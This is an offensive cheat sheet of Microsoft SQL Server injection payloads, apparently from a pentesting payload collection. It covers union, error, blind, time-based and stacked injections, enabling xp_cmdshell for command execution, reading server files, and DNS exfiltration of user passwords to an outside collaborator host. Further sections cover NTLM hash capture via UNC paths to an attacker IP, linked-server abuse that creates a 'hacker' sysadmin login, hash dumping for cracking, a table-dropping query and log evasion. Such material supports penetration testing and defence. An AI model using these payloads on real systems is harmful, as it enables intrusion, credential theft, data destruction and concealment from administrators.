# mssql injection

> mssql injection  is a type of security vulnerability that can occur when an attacker can insert or "inject" malicious sql code into a query executed by a microsoft sql server (mssql) database. this typically happens when user inputs are directly included in sql queries without proper sanitization or parameterization. sql injection can lead to serious consequences such as unauthorized data access, data manipulation, and even gaining control over the database server. 


## summary

* [mssql default databases](#mssql-default-databases)
* [mssql comments](#mssql-comments)
* [mssql enumeration](#mssql-enumeration)
    * [mssql list databases](#mssql-list-databases)
    * [mssql list tables](#mssql-list-tables)
    * [mssql list columns](#mssql-list-columns)
* [mssql union based](#mssql-union-based)
* [mssql error based](#mssql-error-based)
* [mssql blind based](#mssql-blind-based)
    * [mssql blind with substring equivalent](#mssql-blind-with-substring-equivalent)
* [mssql time based](#mssql-time-based)
* [mssql stacked query](#mssql-stacked-query)
* [mssql file manipulation](#mssql-file-manipulation)
    * [mssql read file](#mssql-read-file)
    * [mssql write file](#mssql-write-file)
* [mssql command execution](#mssql-command-execution)
    * [xp_cmdshell](#xp_cmdshell)
    * [python script](#python-script)
* [mssql out of band](#mssql-out-of-band)
    * [mssql dns exfiltration](#mssql-dns-exfiltration)
    * [mssql unc path](#mssql-unc-path)
* [mssql trusted links](#mssql-trusted-links)
* [mssql privileges](#mssql-privileges)
    * [mssql list permissions](#mssql-list-permissions)
    * [mssql make user dba](#mssql-make-user-dba)
* [mssql database credentials](#mssql-database-credentials)
* [mssql opsec](#mssql-opsec)
* [references](#references)


## mssql default databases

| name                  | description                           |
|-----------------------|---------------------------------------|
| pubs	                | not available on mssql 2005           |
| model	                | available in all versions             |
| msdb	                | available in all versions             |
| tempdb	            | available in all versions             |
| northwind	            | available in all versions             |
| information_schema	| available from mssql 2000 and higher  |


## mssql comments

| type                       | description                       |
|----------------------------|-----------------------------------|
| `/* mssql comment */`      | c-style comment                   |
| `--`                       | sql comment                       |
| `;%00`                     | null byte                         |


## mssql enumeration

| description     | sql query |
| --------------- | ----------------------------------------- |
| dbms version    | `select @@version`                        |
| database name   | `select db_name()`                        |
| database schema | `select schema_name()`                    |
| hostname        | `select host_name()`                      |
| hostname        | `select @@hostname`                       |
| hostname        | `select @@servername`                     |
| hostname        | `select serverproperty('productversion')` |
| hostname        | `select serverproperty('productlevel')`   |
| hostname        | `select serverproperty('edition')`        |
| user            | `select current_user`                     |
| user            | `select user_name();`                     |
| user            | `select system_user;`                     |
| user            | `select user;`                            |


### mssql list databases

```sql
select name from master..sysdatabases;
select name from master.sys.databases;

-- for n = 0, 1, 2, …
select db_name(n); 

-- change delimiter value such as ', ' to anything else you want => master, tempdb, model, msdb 
-- (only works in mssql 2017+)
select string_agg(name, ', ') from master..sysdatabases; 
```

### mssql list tables

```sql
-- use xtype = 'v' for views
select name from master..sysobjects where xtype = 'u';
select name from <dbname>..sysobjects where xtype='u'
select name from someotherdb..sysobjects where xtype = 'u';

-- list column names and types for master..sometable
select master..syscolumns.name, type_name(master..syscolumns.xtype) from master..syscolumns, master..sysobjects where master..syscolumns.id=master..sysobjects.id and master..sysobjects.name='sometable';

select table_catalog, table_name from information_schema.columns
select table_name from information_schema.tables where table_catalog='<dbname>'

-- change delimiter value such as ', ' to anything else you want => trace_xe_action_map, trace_xe_event_map, spt_fallback_db, spt_fallback_dev, spt_fallback_usg, spt_monitor, msreplication_options  (only works in mssql 2017+)
select string_agg(name, ', ') from master..sysobjects where xtype = 'u';
```


### mssql list columns

```sql
-- for the current db only
select name from syscolumns where id = (select id from sysobjects where name = 'mytable');

-- list column names and types for master..sometable
select master..syscolumns.name, type_name(master..syscolumns.xtype) from master..syscolumns, master..sysobjects where master..syscolumns.id=master..sysobjects.id and master..sysobjects.name='sometable'; 

select table_catalog, column_name from information_schema.columns

select col_name(object_id('<dbname>.<table_name>'), <index>)
```


## mssql union based

* extract databases names

    ```sql
    $ select name from master..sysdatabases
    [*] injection
    [*] msdb
    [*] tempdb
    ```

* extract tables from injection database

    ```sql
    $ select name from injection..sysobjects where xtype = 'u'
    [*] profiles
    [*] roles
    [*] users
    ```

* extract columns for the table users

    ```sql
    $ select name from syscolumns where id = (select id from sysobjects where name = 'users')
    [*] userid
    [*] username
    ```

* finally extract the data

    ```sql
    $ select  userid, username from users
    ```


## mssql error based

| name         | payload         |
| ------------ | --------------- |
| convert      | `and 1337=convert(int,(select '~'+(select @@version)+'~')) -- -` |
| in           | `and 1337 in (select ('~'+(select @@version)+'~')) -- -` |
| equal        | `and 1337=concat('~',(select @@version),'~') -- -` |
| cast         | `cast((select @@version) as int)` |

* for integer inputs

    ```sql
    convert(int,@@version)
    cast((select @@version) as int)
    ```

* for string inputs

    ```sql
    ' + convert(int,@@version) + '
    ' + cast((select @@version) as int) + '
    ```


## mssql blind based

```sql
and len(select top 1 username from tblusers)=5 ; -- -
```

```sql
select @@version where @@version like '%12.0.2000.8%'
with data as (select (row_number() over (order by message)) as row,* from log_table)
select message from data where row = 1 and message like 't%'
```


### mssql blind with substring equivalent

| function    | example                                         |
| ----------- | ----------------------------------------------- |
| `substring` | `substring('foobar', <start>, <length>)`        |

examples:

```sql
and ascii(substring(select top 1 username from tblusers),1,1)=97
and unicode(substring((select 'a'),1,1))>64-- 
and select substring(table_name,1,1) from information_schema.tables > 'a'
and isnull(ascii(substring(cast((select lower(db_name(0)))as varchar(8000)),1,1)),0)>90
```


## mssql time based

in a time-based blind sql injection attack, an attacker injects a payload that uses `waitfor delay` to make the database pause for a certain period. the attacker then observes the response time to infer whether the injected payload executed successfully or not.

```sql
productid=1;waitfor delay '0:0:10'--
productid=1);waitfor delay '0:0:10'--
productid=1';waitfor delay '0:0:10'--
productid=1');waitfor delay '0:0:10'--
productid=1));waitfor delay '0:0:10'--
```

```sql
if([inference]) waitfor delay '0:0:[sleeptime]'
if 1=1 waitfor delay '0:0:5' else waitfor delay '0:0:0';
```


## mssql stacked query

* stacked query without any statement terminator
    ```sql
    -- multiple select statements
    select 'a'select 'b'select 'c'

    -- updating password with a stacked query
    select id, username, password from users where username = 'admin'exec('update[users]set[password]=''a''')--

    -- using the stacked query to enable xp_cmdshell
    -- you won't have the output of the query, redirect it to a file 
    select id, username, password from users where username = 'admin'exec('sp_configure''show advanced option'',''1''reconfigure')exec('sp_configure''xp_cmdshell'',''1''reconfigure')--
    ```

* use a semi-colon "`;`" to add another query
    ```sql
    productid=1; drop members--
    ```


## mssql file manipulation

### mssql read file

**permissions**: the `bulk` option requires the `administer bulk operations` or the `administer database bulk operations` permission.


```sql
openrowset(bulk 'c:\path\to\file', single_clob)
```

example:

```sql
-1 union select null,(select x from openrowset(bulk 'c:\windows\win.ini',single_clob) r(x)),null,null
```


### mssql write file

```sql
execute spwritestringtofile 'contents', 'c:\path\to\', 'file'
```


## mssql command execution

### xp_cmdshell

```sql
exec xp_cmdshell "net user";
exec master.dbo.xp_cmdshell 'cmd.exe dir c:';
exec master.dbo.xp_cmdshell 'ping 127.0.0.1';
```

if you need to reactivate `xp_cmdshell` (disabled by default in sql server 2005)

```sql
exec sp_configure 'show advanced options',1;
reconfigure;
exec sp_configure 'xp_cmdshell',1;
reconfigure;
```

### python script 

> executed by a different user than the one using `xp_cmdshell` to execute commands

```powershell
execute sp_execute_external_script @language = n'python', @script = n'print(__import__("getpass").getuser())'
execute sp_execute_external_script @language = n'python', @script = n'print(__import__("os").system("whoami"))'
execute sp_execute_external_script @language = n'python', @script = n'print(open("c:\\inetpub\\wwwroot\\web.config", "r").read())'
```


## mssql out of band

### mssql dns exfiltration

technique from https://twitter.com/ptswarm/status/1313476695295512578/photo/1

* **permission**: requires view server state permission on the server.

    ```powershell
    1 and exists(select * from fn_xe_file_target_read_file('c:\*.xel','\\'%2b(select pass from users where id=1)%2b'.xxxx.burpcollaborator.net\1.xem',null,null))
    ```

* **permission**: requires the control server permission.

    ```powershell
    1 (select 1 where exists(select * from fn_get_audit_file('\\'%2b(select pass from users where id=1)%2b'.xxxx.burpcollaborator.net\',default,default)))
    1 and exists(select * from fn_trace_gettable('\\'%2b(select pass from users where id=1)%2b'.xxxx.burpcollaborator.net\1.trc',default))
    ```


### mssql unc path

mssql supports stacked queries so we can create a variable pointing to our ip address then use the `xp_dirtree` function to list the files in our smb share and grab the ntlmv2 hash.

```sql
1'; use master; exec xp_dirtree '\\10.10.15.xx\share';-- 
```

```sql
xp_dirtree '\\attackerip\file'
xp_fileexist '\\attackerip\file'
backup log [testing] to disk = '\\attackerip\file'
backup database [testing] to disk = '\\attackeri\file'
restore log [testing] from disk = '\\attackerip\file'
restore database [testing] from disk = '\\attackerip\file'
restore headeronly from disk = '\\attackerip\file'
restore filelistonly from disk = '\\attackerip\file'
restore labelonly from disk = '\\attackerip\file'
restore rewindonly from disk = '\\attackerip\file'
restore verifyonly from disk = '\\attackerip\file'
```


## mssql trusted links

> the links between databases work even across forest trusts.

```powershell
msf> use exploit/windows/mssql/mssql_linkcrawler
[msf> set deploy true] # set deploy to true if you want to abuse the privileges to obtain a meterpreter session
```

manual exploitation

```sql
-- find link
select * from master..sysservers

-- execute query through the link
select * from openquery("dcorp-sql1", 'select * from master..sysservers')
select version from openquery("linkedserver", 'select @@version as version');

-- chain multiple openquery
select version from openquery("link1",'select version from openquery("link2","select @@version as version")')

-- execute shell commands
execute('sp_configure ''xp_cmdshell'',1;reconfigure;') at linkedserver
select 1 from openquery("linkedserver",'select 1;exec master..xp_cmdshell "dir c:"')

-- create user and give admin privileges
execute('execute(''create login hacker with password = ''''p@ssword123.'''' '') at "dominio\server1"') at "dominio\server2"
execute('execute(''sp_addsrvrolemember ''''hacker'''' , ''''sysadmin'''' '') at "dominio\server1"') at "dominio\server2"
```


## mssql privileges

### mssql list permissions

* listing effective permissions of current user on the server.

    ```sql
    select * from fn_my_permissions(null, 'server'); 
    ```

* listing effective permissions of current user on the database.

    ```sql
    select * from fn_my_permissions (null, 'database');
    ```

* listing effective permissions of current user on a view.

    ```sql
    select * from fn_my_permissions('sales.vindividualcustomer', 'object') order by subentity_name, permission_name; 
    ```

* check if current user is a member of the specified server role.

    ```sql
    -- possible roles: sysadmin, serveradmin, dbcreator, setupadmin, bulkadmin, securityadmin, diskadmin, public, processadmin
    select is_srvrolemember('sysadmin');
    ```


### mssql make user dba

```sql
exec master.dbo.sp_addsrvrolemember 'user', 'sysadmin;
```


## mssql database credentials

* **mssql 2000**: hashcat mode 131: `0x01002702560500000000000000000000000000000000000000008db43dd9b1972a636ad0c7d4b8c515cb8ce46578`
    ```sql
    select name, password from master..sysxlogins
    select name, master.dbo.fn_varbintohexstr(password) from master..sysxlogins 
    -- need to convert to hex to return hashes in mssql error message / some version of query analyzer
    ```
* **mssql 2005**: hashcat mode 132: `0x010018102152f8f28c8499d8ef263c53f8be369d799f931b2fbe`
    ```sql
    select name, password_hash from master.sys.sql_logins
    select name + '-' + master.sys.fn_varbintohexstr(password_hash) from master.sys.sql_logins
    ```


## mssql opsec

use `sp_password` in a query to hide from the logs like : `' and 1=1--sp_password`

```sql
-- 'sp_password' was found in the text of this event.
-- the text has been replaced with this comment for security reasons.
```


## references

- [aws waf clients left vulnerable to sql injection due to unorthodox mssql design choice - marc olivier bergeron - june 21, 2023](https://www.gosecure.net/blog/2023/06/21/aws-waf-clients-left-vulnerable-to-sql-injection-due-to-unorthodox-mssql-design-choice/)
- [error based sql injection in "order by" clause - manish kishan tanwar - march 26, 2018](https://github.com/incredibleindishell/exploit-code-by-me/blob/master/mssql%20error-based%20sql%20injection%20order%20by%20clause/error%20based%20sql%20injection%20in%20“order%20by”%20clause%20(mssql).pdf)
- [full mssql injection pwnage - zeq3ul && jabav0c - january 28, 2009](https://www.exploit-db.com/papers/12975)
- [is_srvrolemember (transact-sql) - microsoft - april 9, 2024](https://docs.microsoft.com/en-us/sql/t-sql/functions/is-srvrolemember-transact-sql?view=sql-server-ver15)
- [mssql injection cheat sheet - @pentestmonkey - august 30, 2011](http://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet)
- [mssql trusted links - hacktricks - september 15, 2024](https://book.hacktricks.xyz/windows/active-directory-methodology/mssql-trusted-links)
- [sql server - link… link… link… and shell: how to hack database links in sql server! - antti rantasaari - june 6, 2013](https://blog.netspi.com/how-to-hack-database-links-in-sql-server/)
- [sys.fn_my_permissions (transact-sql) - microsoft - january 25, 2024](https://docs.microsoft.com/en-us/sql/relational-databases/system-functions/sys-fn-my-permissions-transact-sql?view=sql-server-ver15)